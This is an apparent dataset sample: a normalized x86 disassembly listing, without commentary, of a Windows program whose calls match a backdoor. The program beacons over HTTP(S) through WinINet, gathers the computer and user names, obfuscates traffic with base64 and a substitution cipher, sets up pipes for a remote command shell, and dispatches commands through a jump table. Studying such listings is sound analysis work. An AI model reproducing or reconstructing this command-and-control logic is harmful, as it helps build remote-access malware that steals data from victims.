sub_401000
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
lea edi [ esi + eax ]
lea eax [ eax + eax * 2 + 0x1 ]
push eax
call [ malloc@IAT ]
cmp esi edi
pop ecx
mov edx eax
jae r-xdata
mov ecx [ esp + 0x14 ]
and [ eax ] 0x0
pop edi
pop esi
test ecx ecx
je r-xdata
push ebx
mov eax edx
retn
sub eax edx
mov [ ecx ] eax
cmp cl 0x30
jae r-xdata
mov [ eax ] 0x2b
jmp r-xdata
cmp cl 0x41
jae r-xdata
cmp cl 0x2d
je r-xdata
inc eax
cmp cl 0x5a
jbe r-xdata
cmp cl 0x39
ja r-xdata
cmp cl 0x2e
jne r-xdata
mov cl [ esi ]
inc esi
cmp cl 0x20
jne r-xdata
pop ebx
cmp cl 0x7a
jbe r-xdata
cmp cl 0x61
jae r-xdata
movzx ecx cl
mov ebx ecx
mov [ eax ] 0x25
shr ebx 0x4
and ecx 0xf
add eax 0x3
mov bl [ ebx + rw-data ]
mov [ eax - 0x2 ] bl
mov cl [ ecx + rw-data ]
mov [ eax - 0x1 ] cl
jmp r-xdata
mov [ eax ] cl
cmp cl 0x5f
jne r-xdata
cmp esi edi
jb r-xdata
sub_40109b
push esi
push edi
mov edi [ esp + 0xc ]
push edi
call strlen
xor esi esi
pop ecx
test eax eax
jbe r-xdata
pop edi
pop esi
retn
mov cl [ esi + edi ]
lea edx [ esi + edi ]
cmp cl 0x2e
jl r-xdata
cmp cl 0x45
jl r-xdata
cmp cl 0x3a
jg r-xdata
cmp cl 0x41
jl r-xdata
cmp cl 0x51
jg r-xdata
add cl 0x17
cmp cl 0x69
jl r-xdata
cmp cl 0x44
jg r-xdata
sub cl 0x17
jmp r-xdata
inc esi
cmp esi eax
jb r-xdata
cmp cl 0x52
jl r-xdata
cmp cl 0x6c
jg r-xdata
add cl 0x28
jmp r-xdata
mov [ edx ] cl
jmp r-xdata
cmp cl 0x6d
jl r-xdata
cmp cl 0x5a
jg r-xdata
sub cl 0x28
jmp r-xdata
cmp cl 0x61
jl r-xdata
cmp cl 0x75
jg r-xdata
add cl 0x1b
jmp r-xdata
cmp cl 0x76
jl r-xdata
cmp cl 0x65
jg r-xdata
sub cl 0x1b
jmp r-xdata
cmp cl 0x66
jne r-xdata
cmp cl 0x7a
jg r-xdata
add cl 0x15
jmp r-xdata
cmp cl 0x68
jne r-xdata
mov [ edx ] 0x68
jmp r-xdata
sub cl 0x15
jmp r-xdata
mov [ edx ] 0x66
sub_40116c
push ebp
mov ebp esp
push esi
mov esi ecx
push [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov [ esi + 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ esi + 0x24 ] eax
mov eax [ ebp + 0x1c ]
mov [ esi ] r--data
mov [ esi + 0x10 ] eax
call sub_40133a
push [ ebp + 0x10 ]
mov ecx esi
call sub_40137f
push [ ebp + 0xc ]
mov ecx esi
call sub_4013dc
push [ ebp + 0x14 ]
mov ecx esi
call sub_401421
mov eax esi
pop esi
pop ebp
retn 0x18
sub_4011c8
push esi
mov esi ecx
mov [ esi ] r--data
call sub_401a09
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call ??3@YAXPAX@Z
pop ecx
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call ??3@YAXPAX@Z
pop ecx
mov esi [ esi + 0x20 ]
test esi esi
je r-xdata
push eax
call ??3@YAXPAX@Z
pop ecx
pop esi
retn
push esi
call ??3@YAXPAX@Z
pop ecx
sub_401210
push ebp
mov ebp esp
sub esp 0x20c
push ebx
push esi
xor ebx ebx
push edi
push ebx
push ebx
mov esi ecx
push ebx
push ebx
push [ esi + 0x1c ]
call [ InternetOpenA@IAT ]
cmp eax ebx
mov [ esi + 0x4 ] eax
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x10 ] ebx
lea ecx [ esi + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x24 ] ebx
je r-xdata
mov edi [ InternetSetOptionA@IAT ]
push 0x4
push ecx
push 0x5
push eax
call edi
lea eax [ esi + 0x10 ]
push 0x4
push eax
push 0x2
push [ esi + 0x4 ]
call edi
lea eax [ esi + 0x10 ]
push 0x4
push eax
push 0x6
push [ esi + 0x4 ]
call edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x84000100
mov [ ebp - 0xc ] 0x50
mov [ ebp - 0x4 ] 0x84803100
mov [ ebp - 0xc ] 0x1bb
jmp r-xdata
push ebx
push [ ebp - 0x4 ]
push ebx
push edi
push ebx
push rw-data
push rw-data
push eax
call [ HttpOpenRequestA@IAT ]
cmp eax ebx
mov [ esi + 0xc ] eax
jne r-xdata
push 0x200
lea eax [ ebp - 0x20c ]
push ebx
push eax
call memset
lea eax [ ebp - 0x20c ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x20c ]
push eax
call sub_40109b
add esp 0x18
mov edi rw-data
lea eax [ ebp - 0x20c ]
push ebx
push ebx
push 0x3
push edi
push edi
push [ ebp - 0xc ]
push eax
push [ esi + 0x4 ]
call [ InternetConnectA@IAT ]
cmp eax ebx
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ esi + 0x20 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
call strlen
test eax eax
pop ecx
je r-xdata
push 0x20000000
push 0xffffffff
push rw-data
push [ esi + 0xc ]
call [ HttpAddRequestHeadersA@IAT ]
mov [ ebp - 0x8 ] eax
sub_40133a
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
push edi
push ebx
call strlen
mov edi eax
mov eax [ esi + 0x18 ]
test eax eax
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
inc edi
push edi
call ??2@YAPAXI@Z
push ebx
push eax
mov [ esi + 0x18 ] eax
call strcpy
add esp 0xc
push 0x1
pop eax
pop edi
push eax
call ??3@YAXPAX@Z
pop ecx
pop esi
pop ebx
retn 0x4
sub_40137f
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
push edi
push ebx
call strlen
mov edi eax
mov eax [ esi + 0x14 ]
test eax eax
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ edi + 0x2 ]
push eax
call ??2@YAPAXI@Z
push ebx
push eax
mov [ esi + 0x14 ] eax
call strcpy
mov eax [ esi + 0x14 ]
add esp 0xc
add eax edi
cmp [ eax - 0x1 ] 0x2f
je r-xdata
push eax
call ??3@YAXPAX@Z
pop ecx
pop esi
pop ebx
retn 0x4
push 0x1
pop eax
pop edi
mov [ eax ] 0x2f
mov eax [ esi + 0x14 ]
and [ eax + edi + 0x1 ] 0x0
sub_4013dc
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
push edi
push ebx
call strlen
mov edi eax
mov eax [ esi + 0x1c ]
test eax eax
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
inc edi
push edi
call ??2@YAPAXI@Z
push ebx
push eax
mov [ esi + 0x1c ] eax
call strcpy
add esp 0xc
push 0x1
pop eax
pop edi
push eax
call ??3@YAXPAX@Z
pop ecx
pop esi
pop ebx
retn 0x4
sub_401421
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
push edi
push ebx
call strlen
mov edi eax
mov eax [ esi + 0x20 ]
test eax eax
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
inc edi
push edi
call ??2@YAPAXI@Z
push ebx
push eax
mov [ esi + 0x20 ] eax
call strcpy
add esp 0xc
push 0x1
pop eax
pop edi
push eax
call ??3@YAXPAX@Z
pop ecx
pop esi
pop ebx
retn 0x4
sub_401466
push ebp
mov ebp esp
sub esp 0x60
push ebx
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0xc ] ebx
jne r-xdata
push esi
mov esi 0x40000
push esi
mov [ ebp - 0xc ] ebx
call [ malloc@IAT ]
push esi
push ebx
push eax
mov [ ebp - 0x4 ] eax
call memset
mov esi 0x400
push esi
call [ malloc@IAT ]
push esi
push ebx
push eax
mov [ ebp - 0x8 ] eax
call memset
push esi
call [ malloc@IAT ]
push esi
push ebx
push eax
mov [ ebp - 0x14 ] eax
call memset
push rw-data
push [ ebp - 0x4 ]
call strcpy
push rw-data
push [ ebp - 0x8 ]
call strcpy
add esp 0x40
push [ edi + 0x18 ]
push [ ebp - 0x8 ]
call strcat
push [ edi + 0x14 ]
push [ ebp - 0x8 ]
call strcat
push [ ebp - 0x8 ]
call strlen
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x14 ]
call sub_401779
mov ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
push edx
push eax
push ecx
mov [ eax + ecx ] bl
call sub_401000
mov ecx [ ebp - 0xc ]
push rw-data
push [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ecx + eax ] bl
call strcat
push [ ebp - 0x10 ]
push [ ebp - 0x4 ]
call strcat
push rw-data
push [ ebp - 0x4 ]
call strcat
add esp 0x44
push esi
push ebx
push [ ebp - 0x8 ]
call memset
push esi
push ebx
push [ ebp - 0x14 ]
call memset
push [ ebp - 0x10 ]
call [ free@IAT ]
push [ edi + 0x20 ]
mov [ ebp - 0xc ] ebx
push [ ebp - 0x8 ]
call strcpy
push [ ebp + 0xc ]
lea eax [ ebp - 0x60 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x60 ]
push eax
push [ ebp - 0x8 ]
call strcat
push rw-data
push [ ebp - 0x8 ]
call strcat
add esp 0x40
push rw-data
push [ ebp - 0x8 ]
call strcat
push [ edi + 0x18 ]
push [ ebp - 0x8 ]
call strcat
push rw-data
push [ ebp - 0x8 ]
call strcat
push [ ebp - 0x8 ]
call strlen
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x14 ]
call sub_401779
mov ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
push edx
push eax
push ecx
mov [ eax + ecx ] bl
call sub_401000
mov ecx [ ebp - 0xc ]
push rw-data
push [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ecx + eax ] bl
call strcat
push [ ebp - 0x10 ]
push [ ebp - 0x4 ]
call strcat
add esp 0x44
push rw-data
push [ ebp - 0x4 ]
call strcat
push esi
push ebx
push [ ebp - 0x8 ]
call memset
push esi
push ebx
push [ ebp - 0x14 ]
call memset
push [ ebp - 0x10 ]
mov esi [ free@IAT ]
call esi
push rw-data
mov [ ebp - 0xc ] ebx
push [ ebp - 0x4 ]
call strcat
mov eax [ ebp + 0xc ]
add esp 0x2c
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
push rw-data
push [ ebp - 0x4 ]
call strcat
push rw-data
push [ ebp - 0x4 ]
call strcat
push [ ebp - 0x4 ]
call strlen
push [ ebp - 0x4 ]
call strlen
add esp 0x18
lea eax [ eax + eax + 0x4 ]
push eax
call [ malloc@IAT ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
lea eax [ eax + eax + 0x4 ]
push eax
push ebx
push [ ebp - 0x18 ]
call memset
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x18 ]
call sub_401779
mov ecx [ ebp - 0x18 ]
lea edx [ ebp - 0xc ]
push edx
push eax
push ecx
mov [ eax + ecx ] bl
call sub_401000
push [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
call esi
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
push eax
push [ ebp - 0x4 ]
mov [ ecx + eax ] bl
call strcat
push [ ebp - 0x10 ]
call esi
add esp 0x38
pop edi
pop ebx
leave
retn 0x8
push [ ebp - 0x8 ]
call esi
push [ ebp - 0x14 ]
call esi
push [ ebp - 0x4 ]
call esi
mov eax [ ebp + 0xc ]
add esp 0xc
pop esi
call [ GetLastError@IAT ]
cmp eax 0x2f0d
jne r-xdata
cmp eax 0x2efe
jne r-xdata
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x20 ] 0x4
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x1f
push [ edi + 0xc ]
call [ InternetQueryOptionA@IAT ]
or [ ebp - 0x1b ] 0x1
lea eax [ ebp - 0x1c ]
push 0x4
push eax
push 0x1f
push [ edi + 0xc ]
call [ InternetSetOptionA@IAT ]
test eax eax
je r-xdata
mov [ ebp + 0xc ] 0x1
push [ ebp - 0x4 ]
call strlen
push [ ebp - 0x4 ]
call strlen
pop ecx
pop ecx
jmp r-xdata
push eax
push [ ebp - 0x4 ]
push ebx
push ebx
push [ edi + 0xc ]
call [ HttpSendRequestA@IAT ]
cmp eax ebx
mov [ ebp + 0xc ] eax
jne r-xdata
sub_401779
push ebp
mov ebp esp
sub esp 0x124
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
test ecx ecx
push edi
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
and [ ebp + 0x8 ] 0x0
mov [ ebp + 0xc ] eax
lea eax [ ecx - 0x3 ]
mov [ ebp - 0x8 ] esi
test eax eax
mov ebx rw-data
jle r-xdata
push esi
call strlen
pop ecx
mov [ ebp + 0x10 ] eax
mov ecx eax
cmp [ ebp + 0x8 ] ecx
jge r-xdata
push 0x3
add eax 0x2
xor edx edx
pop ecx
div ecx
mov ecx eax
mov [ ebp - 0xc ] eax
shl ecx 0x2
lea eax [ eax + eax * 2 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
and [ eax ] 0x0
mov eax [ ebp - 0x4 ]
leave
retn
sub ecx [ ebp + 0x8 ]
xor edx edx
mov [ ebp + 0x10 ] edx
test ecx ecx
mov [ ebp + 0x8 ] ecx
jle r-xdata
mov al 0x3d
cmp eax 0x40
jge r-xdata
push 0x10
mov esi ebx
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ] [ esi ]
mov eax edx
shr eax 0x2
and eax 0x3f
movsb [ edi ] [ esi ]
jl r-xdata
mov esi [ ebp - 0x8 ]
mov eax ecx
lea edi [ ebp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edx [ ebp + 0x10 ]
mov al 0x3d
cmp eax 0x40
jge r-xdata
mov al [ ebp + eax - 0x124 ]
jmp r-xdata
mov al 0x3d
cmp eax 0x40
jge r-xdata
mov al 0x3d
cmp eax 0x40
jge r-xdata
mov al [ ebp + eax - 0x9c ]
jmp r-xdata
movsx eax al
mov [ ebp - 0x10 ] eax
mov eax edx
mov ecx edx
push 0x10
shr eax 0xc
and ecx 0x3
and eax 0xf
shl ecx 0x4
or eax ecx
pop ecx
mov esi ebx
lea edi [ ebp - 0x9c ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jl r-xdata
mov al 0x3d
cmp eax 0x40
jge r-xdata
mov al [ ebp + eax - 0x58 ]
jmp r-xdata
mov cl 0x3d
cmp edx 0x40
jge r-xdata
mov al [ ebp + eax - 0xe0 ]
jmp r-xdata
movsx eax al
mov [ ebp - 0x14 ] eax
mov eax edx
shr eax 0x8
mov ecx edx
and eax 0xf
shr ecx 0x16
shl eax 0x2
and ecx 0x3
push 0x10
or eax ecx
pop ecx
mov esi ebx
lea edi [ ebp - 0xe0 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jl r-xdata
mov al 0x3d
mov eax edx
mov ecx edx
shr eax 0x8
and eax 0xf
push 0x10
shr ecx 0x16
shl eax 0x2
and ecx 0x3
mov esi ebx
or eax ecx
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jl r-xdata
mov al [ ebp + eax - 0x58 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x10
mov esi ebx
lea edi [ ebp - 0x58 ]
mov [ ecx ] al
mov eax edx
mov ecx edx
shr eax 0xc
and ecx 0x3
and eax 0xf
shl ecx 0x4
or eax ecx
pop ecx
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
push 0x10
pop ecx
mov esi ebx
lea edi [ ebp - 0x124 ]
mov edx [ eax ]
[ edi ] [ esi ]
mov eax edx
shr eax 0x2
and eax 0x3f
movsb [ edi ] [ esi ]
jl r-xdata
mov ecx [ ebp + 0x10 ]
mov cl [ ebp + edx - 0x58 ]
jmp r-xdata
push 0x10
mov esi ebx
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ] [ esi ]
shr edx 0x10
and edx 0x3f
movsx eax al
movsb [ edi ] [ esi ]
jl r-xdata
mov al 0x3d
push 0x10
mov esi ebx
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ] [ esi ]
shr edx 0x10
and edx 0x3f
movsb [ edi ] [ esi ]
jl r-xdata
cmp eax 0x40
jge r-xdata
mov ecx [ ebp + 0xc ]
cmp [ ebp + 0x8 ] 0x1
mov [ ecx + 0x1 ] al
jle r-xdata
movsx ecx cl
shl ecx 0x8
or ecx eax
mov eax [ ebp + 0xc ]
shl ecx 0x8
or ecx [ ebp - 0x14 ]
add [ ebp + 0xc ] 0x4
add [ ebp - 0x8 ] 0x3
shl ecx 0x8
or ecx [ ebp - 0x10 ]
dec [ ebp - 0xc ]
mov [ eax ] ecx
jne r-xdata
cmp edx 0x40
jge r-xdata
mov al [ ebp + eax - 0x58 ]
jmp r-xdata
mov al [ ebp + edx - 0x58 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp [ ebp + 0x8 ] 0x2
mov [ ecx + 0x2 ] al
jle r-xdata
mov ecx [ ebp + 0xc ]
add [ ebp + 0xc ] 0x4
add [ ebp - 0x4 ] 0x4
mov [ ecx + 0x3 ] al
sub_4019e4
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi ecx
test esi esi
jne r-xdata
push esi
call strlen
pop ecx
push eax
push esi
mov ecx edi
call sub_401466
xor eax eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_401a09
push esi
mov esi ecx
push edi
mov edi [ InternetCloseHandle@IAT ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
and [ esi + 0xc ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
and [ esi + 0x8 ] 0x0
push 0x1
pop eax
pop edi
pop esi
retn
push eax
call edi
and [ esi + 0x4 ] 0x0
sub_401a43
mov eax sub_4033d0
call sub_403210
sub esp 0x284
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x20 ] edi
mov [ rw-data ] edi
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
xor eax eax
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ ebp + 0xc ] edi
je r-xdata
push 0x400
call ??2@YAPAXI@Z
mov esi eax
pop ecx
cmp esi edi
mov [ ebp - 0x68 ] esi
je r-xdata
push ebx
push rw-data
push esi
call strcpy
push rw-data
push esi
call strcat
push esi
call strlen
add esp 0x14
lea ebx [ eax + esi ]
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x18 ] 0x10
push eax
push ebx
call [ GetComputerNameA@IAT ]
push 0x36ee80
lea ecx [ ebp - 0x60 ]
push [ ebp + 0x14 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40116c
mov [ ebp - 0x4 ] edi
cmp [ ebp - 0x10 ] 0x5
je r-xdata
lea ecx [ ebp - 0x60 ]
call sub_401a09
inc [ ebp - 0x10 ]
push 0xea60
call [ Sleep@IAT ]
cmp [ ebp - 0x10 ] 0x5
jb r-xdata
xor esi esi
pop ebx
cmp [ rw-data ] esi
je r-xdata
push 0x10000
call ??2@YAPAXI@Z
mov edi 0x1000
mov [ ebp + 0xc ] eax
push edi
call ??2@YAPAXI@Z
mov esi eax
push edi
push 0x0
push esi
mov [ ebp - 0x34 ] esi
mov [ ebp + 0x14 ] esi
mov [ ebp - 0x64 ] esi
call memset
add esp 0x14
cmp [ ebp + 0xc ] 0x0
je r-xdata
lea ecx [ ebp - 0x60 ]
call sub_401210
cmp eax edi
jne r-xdata
lea ecx [ ebp - 0x60 ]
call sub_401a09
cmp [ ebp + 0xc ] esi
je r-xdata
push esi
push [ rw-data ]
call [ TerminateProcess@IAT ]
push 0xffffffff
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
test esi esi
je r-xdata
cmp [ ebp + 0x14 ] esi
je r-xdata
push [ ebp + 0xc ]
call ??3@YAXPAX@Z
pop ecx
push 0x200
call ??2@YAPAXI@Z
test eax eax
pop ecx
mov [ ebp + 0x10 ] eax
je r-xdata
push [ ebp - 0x68 ]
call ??3@YAXPAX@Z
cmp [ ebp + 0x10 ] esi
pop ecx
je r-xdata
push [ ebp - 0x64 ]
call ??3@YAXPAX@Z
pop ecx
push 0xc
lea eax [ ebp - 0x78 ]
pop edi
mov esi [ CreatePipe@IAT ]
and [ ebp - 0x74 ] 0x0
push 0x0
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x78 ] edi
mov [ ebp - 0x70 ] 0x1
call esi
test eax eax
je r-xdata
push [ rw-data ]
mov esi [ CloseHandle@IAT ]
call esi
push [ rw-data ]
call esi
or edi 0xffffffff
cmp [ ebp - 0x24 ] edi
je r-xdata
push [ ebp + 0x10 ]
call ??3@YAXPAX@Z
pop ecx
lea eax [ ebp - 0x84 ]
and [ ebp - 0x80 ] 0x0
push 0x0
push eax
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x84 ] edi
push eax
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x7c ] 0x1
call esi
test eax eax
je r-xdata
cmp [ ebp - 0x28 ] edi
je r-xdata
push [ ebp - 0x24 ]
call esi
lea eax [ ebp - 0x18c ]
push 0x104
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x18c ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x18c ]
pop ecx
push eax
call [ SetCurrentDirectoryA@IAT ]
push ebx
push rw-data
push [ ebp + 0xc ]
call [ sprintf@IAT ]
push [ ebp + 0xc ]
call strlen
add esp 0x10
cmp [ ebp - 0x30 ] edi
je r-xdata
push [ ebp - 0x28 ]
call esi
and [ ebp - 0x10 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ ebp - 0x60 ]
call sub_401210
test eax eax
jne r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
push [ ebp - 0x30 ]
call esi
mov ebx [ ebp + 0xc ]
test esi esi
jne r-xdata
lea ecx [ ebp - 0x60 ]
call sub_401a09
inc [ ebp - 0x10 ]
push 0xea60
call [ Sleep@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] edi
call sub_4011c8
push [ ebp - 0x1c ]
call esi
push esi
push ebx
lea ecx [ ebp - 0x60 ]
call sub_401466
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push [ ebp - 0x2c ]
mov ebx [ ebp + 0xc ]
and [ ebx ] 0x0
push ebx
push [ ebp - 0x24 ]
call sub_402272
add esp 0xc
mov esi eax
jmp r-xdata
cmp [ ebp - 0x10 ] edi
jae r-xdata
cmp [ ebp - 0x10 ] edi
ja r-xdata
inc [ ebp - 0x10 ]
push 0x7530
call [ Sleep@IAT ]
cmp [ ebp - 0x10 ] edi
jbe r-xdata
test esi esi
jne r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov ebx [ ebp - 0x34 ]
mov edi 0x1000
xor esi esi
push edi
push esi
push ebx
mov [ ebp + 0x14 ] ebx
call memset
add esp 0xc
lea eax [ ebp - 0x14 ]
push eax
push edi
push ebx
push rw-data
push ebx
call strcpy
push ebx
call strlen
add esp 0xc
mov esi eax
mov [ ebp - 0x20 ] 0x1
push rw-data
push ebx
call [ strstr@IAT ]
pop ecx
test eax eax
pop ecx
jne r-xdata
add esi [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edi [ ebp - 0x34 ]
push rw-data
push edi
call [ strstr@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ esi + ebx ]
push edi
push eax
jmp r-xdata
xor eax eax
cmp esi 0x3
jbe r-xdata
xor esi esi
jmp r-xdata
lea ecx [ ebp - 0x60 ]
call sub_4019cc
test eax eax
je r-xdata
test esi esi
je r-xdata
cmp [ edi + eax ] 0xd
jne r-xdata
lea ecx [ ebp - 0x60 ]
call sub_401a09
push 0x5
pop edi
push [ ebp + 0x14 ]
push rw-data
call [ _strcmpi@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
inc eax
lea ecx [ eax + 0x3 ]
cmp ecx esi
jb r-xdata
cmp [ eax + edi + 0x1 ] 0xa
jne r-xdata
mov eax [ ebp + 0xc ]
and [ ebp - 0x20 ] 0x0
and [ ebp - 0x6c ] 0x0
mov esi [ ebp + 0x14 ]
and [ eax ] 0x0
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
jmp r-xdata
cmp [ eax + edi + 0x2 ] 0xd
jne r-xdata
push esi
call sub_402192
push esi
mov [ ebp - 0x38 ] eax
push [ ebp + 0x10 ]
call strcpy
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ eax + edi + 0x3 ] 0xa
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor ebx ebx
push 0x20
push ebx
push esi
xor edi edi
call sub_4021d5
add esp 0xc
mov esi rw-data
lea ecx [ eax + 0x4 ]
cmp ecx esi
je r-xdata
mov eax [ ebp - 0x38 ]
cmp [ eax ] 0x0
jne r-xdata
or edi 0xffffffff
xor ebx ebx
cmp edi 0xa
ja r-xdata
add esi 0x8
inc edi
cmp esi rw-data
jl r-xdata
and [ esi + edi ] 0x0
lea eax [ eax + edi + 0x4 ]
mov [ ebp + 0x14 ] eax
mov esi [ ebp - 0x38 ]
push [ ebp + 0xc ]
call strlen
pop ecx
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
jmp [ edi * 4 + jump_table_40211a ]
push [ rw-data ]
push esi
call [ _strcmpi@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
jmp r-xdata
mov esi eax
push rw-data
push rw-data
push [ ebp + 0x10 ]
call strcat
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
call sub_402146
add esp 0x10
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
push [ ebp - 0x28 ]
push [ ebp - 0x30 ]
push [ ebp + 0xc ]
call sub_402350
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x60 ]
push eax
push [ ebp + 0xc ]
call sub_4025b9
jmp r-xdata
lea eax [ ebp - 0x60 ]
push eax
push [ ebp + 0xc ]
call sub_4028d3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push ebx
push ebx
mov [ rw-data ] eax
push [ ebp + 0xc ]
push sub_402a30
push ebx
push ebx
call [ CreateThread@IAT ]
mov esi eax
push 0xffffffff
push esi
call [ WaitForSingleObject@IAT ]
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
lea eax [ ebp - 0x60 ]
push eax
push [ ebp + 0xc ]
call sub_402dd4
jmp r-xdata
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x18 ] 0x101
push eax
lea eax [ ebp - 0x290 ]
push eax
push 0x2
call GetUserNameExA
lea eax [ ebp - 0x290 ]
push eax
push [ ebp + 0xc ]
call strcat
push rw-data
push [ ebp + 0xc ]
call strcat
add esp 0x10
jmp r-xdata
push rw-data
jmp r-xdata
lea eax [ ebp - 0x60 ]
push eax
push [ ebp + 0xc ]
call sub_402f31
jmp r-xdata
lea eax [ ebp - 0x60 ]
push eax
push [ ebp + 0xc ]
call sub_402f5e
jmp r-xdata
lea ecx [ ebp - 0x60 ]
call sub_401a09
mov edi [ ebp - 0x10 ]
push 0x5
pop ebx
pop ecx
pop ecx
push [ ebp + 0xc ]
call strcat
push rw-data
lea ecx [ ebp - 0x60 ]
call sub_4019e4
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x60 ]
call sub_401210
test eax eax
jne r-xdata
push rw-data
lea ecx [ ebp - 0x60 ]
call sub_4019e4
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x60 ]
push eax
push 0x1000
push esi
call sub_4019cc
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x60 ]
call sub_401210
test eax eax
jne r-xdata
lea ecx [ ebp - 0x60 ]
call sub_401a09
push 0xea60
inc edi
call [ Sleep@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x60 ]
call sub_401a09
and [ eax + esi ] 0x0
xor eax eax
cmp [ ebp - 0x14 ] 0x3
jbe r-xdata
lea ecx [ ebp - 0x60 ]
call sub_401a09
push 0xea60
inc edi
call [ Sleep@IAT ]
jmp r-xdata
cmp edi ebx
jae r-xdata
push esi
call [ atoi@IAT ]
test eax eax
pop ecx
mov [ ebp - 0x18 ] eax
je r-xdata
cmp [ esi + eax ] 0xd
jne r-xdata
cmp edi ebx
jae r-xdata
